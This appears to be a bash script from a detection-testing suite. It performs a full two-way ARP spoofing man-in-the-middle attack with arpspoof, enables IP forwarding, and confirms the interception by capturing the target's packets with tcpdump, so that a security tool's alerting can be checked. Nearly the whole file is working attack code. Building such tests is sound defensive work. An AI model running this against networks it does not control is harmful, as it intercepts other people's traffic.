#!/usr/bin/env bash
# =============================================================================
# 11 — ARP Spoofing / MitM
# Tool: arpspoof (from dsniff)
# SSS should detect: network anomaly (protocol deviation at L2)
# Note: ARP is Layer 2 — iptables cannot block it, but SSS should alert.
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "11_arp_spoof"

DURATION=15  # seconds of ARP spoofing

# ---------------------------------------------------------------------------
# Determine the gateway IP (default route)
# ---------------------------------------------------------------------------
GATEWAY=$(ip route | awk '/default/ {print $3}' | head -1)
IFACE=$(ip route | awk '/default/ {print $5}' | head -1)

if [[ -z "${GATEWAY}" || -z "${IFACE}" ]]; then
    echo "[!] Could not determine default gateway or interface."
    record_result "false" "Could not determine gateway/interface for ARP spoofing." ""
    exit 0
fi

echo "[*] Gateway: ${GATEWAY}"
echo "[*] Interface: ${IFACE}"
echo "[*] Target: ${TARGET_IP}"

# ---------------------------------------------------------------------------
# Enable IP forwarding (required for MitM to not break connectivity)
# ---------------------------------------------------------------------------
echo "[*] Enabling IP forwarding..."
ORIG_FORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
echo 1 > /proc/sys/net/ipv4/ip_forward

# ---------------------------------------------------------------------------
# Launch ARP spoofing
# ---------------------------------------------------------------------------
echo "[*] Starting ARP spoof: telling ${TARGET_IP} that we are ${GATEWAY}..."

# Spoof target -> we become the gateway
arpspoof -i "${IFACE}" -t "${TARGET_IP}" "${GATEWAY}" \
    >/tmp/arpspoof_1.txt 2>&1 &
PID1=$!

# Spoof gateway -> we become the target (full MitM)
arpspoof -i "${IFACE}" -t "${GATEWAY}" "${TARGET_IP}" \
    >/tmp/arpspoof_2.txt 2>&1 &
PID2=$!

echo "[*] ARP spoofing active for ${DURATION} seconds..."
sleep "${DURATION}"

# ---------------------------------------------------------------------------
# Verify MitM worked by checking ARP tables on our side
# ---------------------------------------------------------------------------
echo "[*] Checking ARP cache..."
arp_output=$(arp -an 2>/dev/null || ip neigh show 2>/dev/null || echo "no arp output")

# Try to intercept a request (proof of MitM)
echo "[*] Attempting to verify MitM position..."
# If we're in the middle, we should see traffic on the interface
captured=$(timeout 5 tcpdump -i "${IFACE}" -c 5 \
    "host ${TARGET_IP} and not arp" 2>&1) || captured="no packets"
packet_count=$(echo "${captured}" | grep -c "IP " || true)

# ---------------------------------------------------------------------------
# Clean up
# ---------------------------------------------------------------------------
echo "[*] Stopping ARP spoof..."
kill "${PID1}" "${PID2}" 2>/dev/null || true
wait "${PID1}" "${PID2}" 2>/dev/null || true

# Restore IP forwarding
echo "${ORIG_FORWARD}" > /proc/sys/net/ipv4/ip_forward

spoof_output1=$(cat /tmp/arpspoof_1.txt 2>/dev/null || echo "")
spoof_output2=$(cat /tmp/arpspoof_2.txt 2>/dev/null || echo "")
combined="${spoof_output1}\n${spoof_output2}"

# Count ARP replies sent
arp_replies=$(echo -e "${combined}" | grep -c "is-at\|reply" || true)

# ---------------------------------------------------------------------------
# Determine result
# ---------------------------------------------------------------------------
if [[ "${arp_replies}" -gt 0 ]] && [[ "${packet_count}" -gt 0 ]]; then
    evidence="ARP spoof successful: sent ${arp_replies} forged ARP replies, captured ${packet_count} redirected packets."
    record_result "true" "${evidence}" "${arp_output}"
elif [[ "${arp_replies}" -gt 0 ]]; then
    evidence="ARP spoof partially successful: sent ${arp_replies} forged ARP replies but couldn't verify packet interception."
    record_result "true" "${evidence}" "${arp_output}"
else
    evidence="ARP spoof failed or was detected. Replies sent: ${arp_replies}."
    record_result "false" "${evidence}" "${arp_output}"
fi

rm -f /tmp/arpspoof_1.txt /tmp/arpspoof_2.txt
